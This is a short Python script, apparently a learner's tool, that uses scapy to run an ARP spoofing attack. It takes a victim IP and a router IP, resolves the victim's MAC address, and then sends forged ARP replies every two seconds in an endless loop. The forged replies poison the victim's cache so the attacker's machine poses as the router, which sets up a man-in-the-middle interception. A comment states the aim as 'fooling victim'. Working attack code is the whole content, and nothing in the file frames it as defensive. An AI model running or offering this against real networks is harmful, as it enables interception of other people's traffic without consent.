import scapy.all as scapy
import optparse
import scapyarp
import time

parser = optparse.OptionParser() # im creating a object for this  class
parser.add_option("-r", "--interface ", dest= "router")
parser.add_option("-v", "--mac ", dest= "victim",help = "this for mac")
(values,arguments)=parser.parse_args()  # this value is a object of a set class





victim_ip =values.victim

router_ip = values.router

def arp_res(victim_ip,router_ip): # this is for fooling victim
    vic_mac = scapyarp.arp_request(values.victim)
    while True:
        arp_response = scapy.ARP(op=2,pdst=victim_ip , hwdst=vic_mac ,psrc= router_ip)
        print(arp_response.summary())
        print(arp_response.show())
        scapy.send(arp_response)
        print("-----------SPOOFING-------")
        time.sleep(2)


arp_res(victim_ip,router_ip)

